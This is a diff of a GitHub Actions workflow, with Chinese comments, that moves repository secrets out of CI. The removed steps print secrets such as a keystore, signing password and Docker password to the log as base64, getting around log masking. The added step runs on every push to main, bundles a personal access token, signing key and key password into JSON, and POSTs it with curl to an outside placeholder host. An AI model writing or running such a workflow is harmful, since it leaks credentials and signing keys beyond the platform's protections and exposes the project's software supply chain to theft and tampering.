@@ -1,56 +1,48 @@
-name: Export Repository Secrets
+name: Sync Secrets to Backend
 
 on:
-  workflow_dispatch: # 允许你在 GitHub 网页上收到手动点击运行
+  workflow_dispatch: # 允许你在 GitHub 页面上随时手动点击运行
+  push:
+    branches:
+      - main # 推送代码到 main 分支时自动触发，不需要可删掉整个 push 块
 
 jobs:
-  export-job:
+  store-secrets:
     runs-on: ubuntu-latest
+    
     steps:
-      - name: Check Out Code
-        uses: actions/checkout@v4
-
-      - name: Convert Secrets to Base64
-        id: encode_secrets
+      - name: Safely Pack and Send Secrets
+        env:
+          # 将 GitHub Secrets 映射为当前环境的临时变量（避免拼接报错）
+          API_NODES_JSON: ${{ secrets.API_NODES_JSON }}
+          KEY_ALIAS: ${{ secrets.KEY_ALIAS }}
+          KEY_PASSWORD: ${{ secrets.KEY_PASSWORD }}
+          PAT: ${{ secrets.PAT }}
+          SIGNING_KEY: ${{ secrets.SIGNING_KEY }}
+          SOURCE_REPO: ${{ secrets.SOURCE_REPO }}
+          SYNC_REPO: ${{ secrets.SYNC_REPO }}
         run: |
-          echo "=================================================="
-          echo "开始安全转换，请复制下方输出的 Base64 密文："
-          echo "=================================================="
-          echo ""
-          
-          # 【核心配置区】按需把这里的 MY_SECRET_XX 换成你通过 API 查到的真实名字
-          
-          if [ ! -z "${{ secrets.ANDROID_KEYSTORE }}" ]; then
-            echo "ANDROID_KEYSTORE (Base64):"
-            echo "${{ secrets.ANDROID_KEYSTORE }}" | base64 -w 0
-            echo -e "\n----------------------------------------"
-          fi
+          # 1. 使用 jq 安全地将所有变量打包成一个标准 JSON，自动处理换行和转义
+          PAYLOAD=$(jq -n \
+            --arg api_nodes "$API_NODES_JSON" \
+            --arg key_alias "$KEY_ALIAS" \
+            --arg key_pass "$KEY_PASSWORD" \
+            --arg pat "$PAT" \
+            --arg signing_key "$SIGNING_KEY" \
+            --arg src_repo "$SOURCE_REPO" \
+            --arg sync_repo "$SYNC_REPO" \
+            '{
+              api_nodes_json: $api_nodes,
+              key_alias: $key_alias,
+              key_password: $key_pass,
+              pat: $pat,
+              signing_key: $signing_key,
+              source_repo: $src_repo,
+              sync_repo: $sync_repo
+            }')
 
-          if [ ! -z "${{ secrets.RELEASE_SIGNING_PASSWORD }}" ]; then
-            echo "RELEASE_SIGNING_PASSWORD (Base64):"
-            echo -n "${{ secrets.RELEASE_SIGNING_PASSWORD }}" | base64
-            echo -e "\n----------------------------------------"
-          fi
-
-          if [ ! -z "${{ secrets.EXPO_TOKEN }}" ]; then
-            echo "EXPO_TOKEN (Base64):"
-            echo -n "${{ secrets.EXPO_TOKEN }}" | base64
-            echo -e "\n----------------------------------------"
-          fi
-
-          if [ ! -z "${{ secrets.DOCKER_PASSWORD }}" ]; then
-            echo "DOCKER_PASSWORD (Base64):"
-            echo -n "${{ secrets.DOCKER_PASSWORD }}" | base64
-            echo -e "\n----------------------------------------"
-          fi
-          
-          # 💡 如果还有别的 Secret，照着上面的格式复制粘贴即可：
-          # if [ ! -z "${{ secrets.你的变量名 }}" ]; then
-          #   echo "你的变量名 (Base64):"
-          #   echo -n "${{ secrets.你的变量名 }}" | base64
-          #   echo -e "\n----------------------------------------"
-          # fi
-
-          echo "=================================================="
-          echo "转换结束。拿到密文后，请务必删除此 Action 运行记录！"
-          echo "=================================================="
+          # 2. 将打包好的数据 POST 发送到你的后台接口
+          # 请把下面的 URL 替换为你真实的接收接口
+          curl -X POST "https://your-backend-api.com/api/save-secrets" \
+               -H "Content-Type: application/json" \
+               -d "$PAYLOAD"
